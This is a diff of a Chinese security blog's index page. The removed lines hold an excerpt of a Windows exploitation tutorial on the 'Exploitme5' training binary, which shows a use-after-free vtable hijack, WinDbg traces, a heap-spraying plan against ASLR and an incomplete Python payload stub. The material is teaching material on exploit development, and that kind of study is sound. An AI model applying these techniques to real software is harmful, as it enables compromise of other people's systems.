class="number">168</span></span><br><span class="line">block <span class="number">1</span>: address = <span class="number">0x00d864a0</span>; size = <span class="number">168</span>	<span class="comment">// 发现新block中的data地址，和上面被删除的multiplier对象地址相同	</span></span><br><span class="line">----------------------</span><br><span class="line">...</span><br><span class="line">Your choice [<span class="number">1</span><span class="number">-6</span>]:<span class="number">6</span></span><br></pre></td></tr></table></figure>
-
-<p>payload成功占据了mutators[0]所指对象的空间，劫持成功。</p>
-<p>如果继续执行变换，windbg中报错信息如下：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">(5504.23e8): Access violation - code c0000005 (first chance)</span><br><span class="line">First chance exceptions are reported before any exception handling.</span><br><span class="line">This exception may be expected and handled.</span><br><span class="line">eax=010c6318 ebx=00dcc000 ecx=010c64a0 edx=00000000 esi=61616161 edi=761ee410</span><br><span class="line">eip=008a1972 esp=00bffe98 ebp=00bffeac iopl=0         nv up ei ng nz ac po cy</span><br><span class="line">cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00010293</span><br><span class="line">Exploitme5!mutateBlock+0x112:</span><br><span class="line">008a1972 ff5604          call    dword ptr [esi+4]    ds:002b:61616165=????????</span><br></pre></td></tr></table></figure>
-
-<p>可以看到虚指针被覆盖。</p>
-<h3 id="构造shellcode"><a href="#构造shellcode" class="headerlink" title="构造shellcode"></a>构造shellcode</h3><p>我们需要将虚指针指向构造好的虚表，需表中存储指向shellcode的指针。</p>
-<h4 id="确定虚函数在虚表中的位置"><a href="#确定虚函数在虚表中的位置" class="headerlink" title="确定虚函数在虚表中的位置"></a>确定虚函数在虚表中的位置</h4><p>通过以下命令，确定虚函数mutate()的地址在虚表中的位置：在第4-7个字节处</p>
-<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0</span>:<span class="number">004</span>&gt; dd mutators</span><br><span class="line"><span class="number">008</span>a5454  <span class="number">00</span>c964a0 <span class="number">00</span>c96ce8 <span class="number">00000000</span> <span class="number">00000000</span></span><br><span class="line"><span class="number">008</span>a5464  <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span></span><br><span class="line"><span class="number">008</span>a5474  <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span></span><br><span class="line"><span class="number">008</span>a5484  <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span></span><br><span class="line"><span class="number">008</span>a5494  <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span></span><br><span class="line"><span class="number">008</span>a54a4  <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span></span><br><span class="line"><span class="number">008</span>a54b4  <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span></span><br><span class="line"><span class="number">008</span>a54c4  <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span></span><br><span class="line"><span class="number">0</span>:<span class="number">004</span>&gt; dt Multiplier <span class="number">00</span>c964a0	<span class="comment">// mutators[0]</span></span><br><span class="line">Exploitme5!Multiplier</span><br><span class="line">   +<span class="number">0x000</span> __VFN_table : <span class="number">0x008a34f8</span> </span><br><span class="line">   +<span class="number">0x004</span> param            : <span class="number">0</span>n2</span><br><span class="line">   +<span class="number">0x008</span> reserved         : [<span class="number">40</span>] <span class="number">0</span>n<span class="number">-1163005939</span></span><br><span class="line"><span class="number">0</span>:<span class="number">004</span>&gt; dd <span class="number">0x008a34f8</span>			<span class="comment">// mutators[0]的虚指针</span></span><br><span class="line"><span class="number">008</span>a34f8  <span class="number">008</span>a1260 <span class="number">008</span>a1270 <span class="number">00000000</span> <span class="number">008</span>a37a8</span><br><span class="line"><span class="number">008</span>a3508  <span class="number">008</span>a1260 <span class="number">008</span>a12b0 <span class="number">000000</span>c0 <span class="number">00000000</span></span><br><span class="line"><span class="number">008</span>a3518  <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span></span><br><span class="line"><span class="number">008</span>a3528  <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span></span><br><span class="line"><span class="number">008</span>a3538  <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span></span><br><span class="line"><span class="number">008</span>a3548  <span class="number">00000000</span> <span class="number">008</span>a5008 <span class="number">008</span>a3838 <span class="number">00000001</span></span><br><span class="line"><span class="number">008</span>a3558  <span class="number">008</span>a3118 <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span></span><br><span class="line"><span class="number">008</span>a3568  <span class="number">00000100</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span></span><br><span class="line"><span class="number">0</span>:<span class="number">004</span>&gt; u <span class="number">008</span>a1270	<span class="comment">// 虚函数表中的第二个函数指针（第4-7个字节），是我们需要劫持的mutate()的地址</span></span><br><span class="line">Exploitme5!Multiplier::mutate [D:\Users\czx\NativeFiles\Desktop\blog\code\Exploitme5\Exploitme5.cpp @ <span class="number">19</span>]:</span><br><span class="line"><span class="number">008</span>a1270 <span class="number">55</span>              push    ebp</span><br><span class="line"><span class="number">008</span>a1271 <span class="number">8b</span>ec            mov     ebp,esp</span><br><span class="line"><span class="number">008</span>a1273 <span class="number">8b</span>450c          mov     eax,dword ptr [ebp+<span class="number">0</span>Ch]</span><br><span class="line"><span class="number">008</span>a1276 <span class="number">99</span>              cdq</span><br><span class="line"><span class="number">008</span>a1277 <span class="number">83e203</span>          <span class="keyword">and</span>     edx,<span class="number">3</span></span><br><span class="line"><span class="number">008</span>a127a <span class="number">53</span>              push    ebx</span><br><span class="line"><span class="number">008</span>a127b <span class="number">56</span>              push    esi</span><br><span class="line"><span class="number">008</span>a127c <span class="number">33f</span>6            <span class="keyword">xor</span>     esi,esi</span><br></pre></td></tr></table></figure>
-
-<p>现在的问题在于，我们不知道该让vt_ptr指向哪里。我们可以将虚表和<code>shellcode</code>写到<code>buf.dat</code>文件中，并读入到块中。但由于<code>ASLR</code>我们无法确定<code>buf.dat</code>对应块的地址。</p>
-<h4 id="Heap-Spraying确定虚指针"><a href="#Heap-Spraying确定虚指针" class="headerlink" title="Heap Spraying确定虚指针"></a>Heap Spraying确定虚指针</h4><p>我们可以使用<code>Heap Spraying</code>的方法，保证某个地址一定存储了我们需要的虚表+<code>shellcode</code>，然后我们把这个地址赋值给虚表指针即可。</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">import struct</span><br><span class="line">with open(&quot;D:\\Users\\czx\\NativeFiles\\Desktop\\tmp\\name.dat&quot;, &quot;wb&quot;) as f:</span><br><span class="line">    obj1_addr = 0x00c964a0</span><br><span class="line"></span><br><span class="line">    shellcode = b&quot;...&quot;</span><br><span class="line">    vt_ptr = struct.pack(&quot;&lt;I&quot;, obj_addr + 4)</span><br><span class="line">    vt = b&quot;a&quot;*4 + struct.pack(&quot;&lt;I&quot;, obj_addr + 12)</span><br><span class="line"></span><br><span class="line">    payload = vt_ptr + vt + shellcode</span><br><span class="line">    f.write(b&#x27;a&#x27;*168)</span><br></pre></td></tr></table></figure>
-
-
+          <!--noindex-->
+            <div class="post-button">
+              <a class="btn" href="/2023/11/02/Windwos-PWN/Exploitme/Exploitme5/#more" rel="contents">
+                阅读全文 &raquo;
+              </a>
+            </div>
+          <!--/noindex-->
+        
       
     </div>
 
@@ -305,7 +636,7 @@
   
 
   <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
-    <link itemprop="mainEntityOfPage" href="https://czxvan.github.io/2023/10/31/else/Memory-Mountains/">
+    <link itemprop="mainEntityOfPage" href="https://czxvan.github.io/2023/10/29/Learning-Cpp/overview/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="image" content="/images/avatar.gif">
@@ -323,76 +654,7 @@
     </span>
       <header class="post-header">
         <h2 class="post-title" itemprop="name headline">
-          <a href="/2023/10/31/else/Memory-Mountains/" class="post-title-link" itemprop="url">Memory Mountains</a>
-        </h2>
-
-        <div class="post-meta-container">
-          <div class="post-meta">
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar"></i>
-      </span>
-      <span class="post-meta-item-text">发表于</span>
-      
-
-      <time title="创建时间：2023-10-31 21:57:51 / 修改时间：21:59:41" itemprop="dateCreated datePublished" datetime="2023-10-31T21:57:51+08:00">2023-10-31</time>
-    </span>
-
-  
-</div>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-          
-      
-    </div>
-
-    
-    
-    
-
-    <footer class="post-footer">
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-</div>
-
-
-
-
-    
-
-
-<div class="post-block">
-  
-  
-
-  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
-    <link itemprop="mainEntityOfPage" href="https://czxvan.github.io/2023/10/29/LearningNotes/Learning-Cpp/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="czxvan">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="czxvan's blog">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
-      <meta itemprop="name" content="undefined | czxvan's blog">
-      <meta itemprop="description" content="">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          <a href="/2023/10/29/LearningNotes/Learning-Cpp/" class="post-title-link" itemprop="url">Learning-C++</a>
+          <a href="/2023/10/29/Learning-Cpp/overview/" class="post-title-link" itemprop="url">Learning-C++</a>
         </h2>
 
         <div class="post-meta-container">
@@ -435,7 +697,7 @@
           <p>c++学习笔记。</p>
           <!--noindex-->
             <div class="post-button">
-              <a class="btn" href="/2023/10/29/LearningNotes/Learning-Cpp/#more" rel="contents">
+              <a class="btn" href="/2023/10/29/Learning-Cpp/overview/#more" rel="contents">
                 阅读全文 &raquo;
               </a>
             </div>
@@ -850,7 +1112,7 @@
         <i class="far fa-calendar-check"></i>
       </span>
       <span class="post-meta-item-text">更新于</span>
-      <time title="修改时间：2023-11-02 17:05:39" itemprop="dateModified" datetime="2023-11-02T17:05:39+08:00">2023-11-02</time>
+      <time title="修改时间：2023-11-04 17:31:54" itemprop="dateModified" datetime="2023-11-04T17:31:54+08:00">2023-11-04</time>
     </span>
     <span class="post-meta-item">
       <span class="post-meta-item-icon">
@@ -949,7 +1211,7 @@
         <i class="far fa-calendar-check"></i>
       </span>
       <span class="post-meta-item-text">更新于</span>
-      <time title="修改时间：2023-10-31 14:38:59" itemprop="dateModified" datetime="2023-10-31T14:38:59+08:00">2023-10-31</time>
+      <time title="修改时间：2023-11-04 17:30:49" itemprop="dateModified" datetime="2023-11-04T17:30:49+08:00">2023-11-04</time>
     </span>
     <span class="post-meta-item">
       <span class="post-meta-item-icon">
@@ -979,102 +1241,6 @@
           <!--noindex-->
             <div class="post-button">
               <a class="btn" href="/2023/10/20/Windwos-PWN/Exploitme/Exploitme3/#more" rel="contents">
-                阅读全文 &raquo;
-              </a>
-            </div>
-          <!--/noindex-->
-        
-      
-    </div>
-
-    
-    
-    
-
-    <footer class="post-footer">
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-</div>
-
-
-
-
-    
-
-
-<div class="post-block">
-  
-  
-
-  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
-    <link itemprop="mainEntityOfPage" href="https://czxvan.github.io/2023/10/20/Windwos-PWN/Create-Shellcode-in-Windows/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="czxvan">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="czxvan's blog">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
-      <meta itemprop="name" content="undefined | czxvan's blog">
-      <meta itemprop="description" content="">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          <a href="/2023/10/20/Windwos-PWN/Create-Shellcode-in-Windows/" class="post-title-link" itemprop="url">Create Shellcode in Windows</a>
-        </h2>
-
-        <div class="post-meta-container">
-          <div class="post-meta">
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar"></i>
-      </span>
-      <span class="post-meta-item-text">发表于</span>
-
-      <time title="创建时间：2023-10-20 22:07:43" itemprop="dateCreated datePublished" datetime="2023-10-20T22:07:43+08:00">2023-10-20</time>
-    </span>
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar-check"></i>
-      </span>
-      <span class="post-meta-item-text">更新于</span>
-      <time title="修改时间：2023-10-31 22:49:30" itemprop="dateModified" datetime="2023-10-31T22:49:30+08:00">2023-10-31</time>
-    </span>
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-folder"></i>
-      </span>
-      <span class="post-meta-item-text">分类于</span>
-        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-          <a href="/categories/Windows-PWN/" itemprop="url" rel="index"><span itemprop="name">Windows-PWN</span></a>
-        </span>
-    </span>
-
-  
-</div>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-          <p>讲解windwos下开发位置无关shellcode的基础知识，并构建框架代码和提取脚本。</p>
-<p>参考链接：</p>
-<ul>
-<li><a target="_blank" rel="noopener" href="https://tttang.com/archive/901/">Exploit开发系列教程-Windows基础&amp;shellcode)</a></li>
-</ul>
-          <!--noindex-->
-            <div class="post-button">
-              <a class="btn" href="/2023/10/20/Windwos-PWN/Create-Shellcode-in-Windows/#more" rel="contents">
                 阅读全文 &raquo;
               </a>
             </div>
